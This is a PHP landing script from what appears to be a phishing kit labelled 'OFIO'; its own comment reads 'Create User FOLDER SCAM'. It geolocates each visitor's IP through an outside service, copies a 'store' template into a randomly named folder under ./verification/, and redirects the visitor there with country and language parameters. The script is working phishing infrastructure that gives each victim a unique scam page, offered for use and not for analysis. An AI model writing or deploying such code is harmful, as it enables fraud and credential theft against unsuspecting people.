<?php

#################################################
#                                               #
#                                               #
#                 OFIO                          #
#      
#                                               #
#################################################
@ini_set('display_errors', 0);
session_start();
// Detect Browser Language !
$lang_var = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);


switch ($lang_var){
    case "fr":
        $lang= "fr"; 
        break;
    case "it":
        $lang= "it";
        break;
    case "en":
        $lang= "en";
        break;        
    default:
        $lang= "en";
        break;
}
$_SESSION['_lang_'] = $lang;
#END

// GET Country & Country CODE !


    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $countrycode = $ip_data->geoplugin_countryCode;
        $_SESSION['cntcode'] = $countrycode;
    }
    
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
        $_SESSION['cntname'] = $countryname;
    }


#END

// Create User FOLDER SCAM !
for ($DIR = '', $i = 0, $z = strlen($a = 'ABCDEMN0123456789')-1; $i != 20; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./verification/".$DIR;
$JOkEr7="store";

function recurse_copy($JOkEr7,$DIR) {
$dir = opendir($JOkEr7);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($JOkEr7 . '/' . $file) ) {
recurse_copy($JOkEr7 . '/' . $file,$DIR . '/' . $file);
}
else {
copy($JOkEr7 . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}

recurse_copy( $JOkEr7, $DIR );
#END
//LOCATION !

header("location:".$DIR."/index.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']);
#END
?>
